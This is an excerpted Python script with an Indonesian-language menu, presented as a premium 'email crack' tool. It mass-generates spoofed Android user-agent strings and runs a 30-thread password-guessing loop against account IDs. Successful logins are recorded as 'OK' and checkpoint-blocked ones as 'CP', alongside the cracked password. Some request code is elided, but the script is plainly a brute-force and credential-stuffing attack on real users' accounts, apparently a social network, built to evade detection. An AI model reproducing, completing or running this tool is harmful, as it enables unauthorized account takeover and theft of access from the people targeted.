...
for xr in range(10000):
    rr = random.randint
    rc = random.choice
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; TB-Q706F) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; RMX3286) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; RMX3263) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent5 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-G920F) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent6 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; CPH1869) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent7 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; X680D) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent8 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; G998B) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent9 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; 21091116UI) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"    
    ugent10 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    xr = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent9,ugent10])
    ugen.append(xr)
...
for xd in range(1000):
    ...
    pro = f"mozilla/5.0 (linux; android {str(rr(6,9))}; {str(rc(merek))}) applewebkit/537.36 (khtml, like gecko) chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} mobile safari/537.36"
    pro1 = f"mozilla/5.0 (linux; android {str(rr(9,12))}; {str(rc(merek))}) applewebkit/537.36 (khtml, like gecko) chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} mobile safari/537.36 opr/{str(rr(10,73))}.0.3835.69408"
    sygkamu = random.choice([pro,pro1])
    strv111.append(sygkamu)   
#--------------------[ WARNA-COLOR ]-----------------------#
...
def logo():
	clear()
	print(f'''                                         
\033[95m   __  __     ______     ______     ______    
\033[95m  /\_\_\_\   /\___  \   /\  ___\   /\  ___\   
\033[95m   \/_/\_\/_  \/_/  /__  \ \  __\   \ \  __\   
\033[95m     /\_\/\_\   /\_____\  \ \_____\  \ \_____\ 
\033[95m     \/_/\/_/   \/_____/   \/_____/   \/_____/  
            {U}  SCRIPT CRACK KHUSUS EMAIL
                  {U} VERSION : PREMIUM''')
#--------------------[ BAGIAN-MENU ]----------------------#
def menu_xd():
	os.system ('clear') 
	logo() 
	print(f'[1] Crack ID Email') 
	print(f'[2] Cek Ressult Crack')
	print(f'[3] Log Out')
	xdxd_dev = input(f'\npilih menu : ')
	if xdxd_dev in ['1','01']:
		crack_email()
...
def cek_result():
	print('')
	print(f'[1] Cek Ressult OK')
	print(f'[2] Cek Ressult CP')
	print(f'[3] Log Out')
	xr = input(f'\npilih menu : ')
	if xr in ['1','01']: 
...
def setting():
	...
	if xr_dev_ganz in ['1','01']:
		...
		exit()
	print('')
	print(f'[1] Methode Mobile{x}') 
	print(f'[2] Methode M.Touch{x}') 
	xr_ganz = input(f'\npilih metode : ')
	if xr_ganz in ['1','01']:
		...
		method.append('mobile')
	print('') 
	print(f'[1] Direkomendasikan') 
	print(f'[2] Tidak Direkomendasikan') 
	print(f'[3] Sangat Direkomendasikan') 
	xr_dev = input(f'\npilih password : ') 
	if xr_dev in ['1','01']:
		pass_v1() 
	elif xr_dev in ['2','02']:
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crackmobile,idf,pwv)
	print('')
	print(f'total ok : {H}%s{x} '%(ok)) 
	print(f'total cp : {k}%s{x} '%(cp))
#--------------------[ MOBILE-ASYNC ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[Firdaus] {loop}/{len(id)} OK:[bold green]{ok}[/] CP:[bold yellow]{cp}[/]") #SOURCE LUZI-XD
	prog.advance(des) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cp+=1
				tree = Tree(f"  ")
				tree.add(f"[Firdaus-CP] [bold yellow]{idf} ━⫸ {pw}")
				...
				tree = Tree(f"  ")
				tree.add(f"[Firdaus-OK] [bold green]{idf} ━⫸ {pw} ━⫸ {ua}")
...
def crackmtouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[Firdaus] {loop}/{len(id)} OK:[bold green]{ok}[/] CP:[bold yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
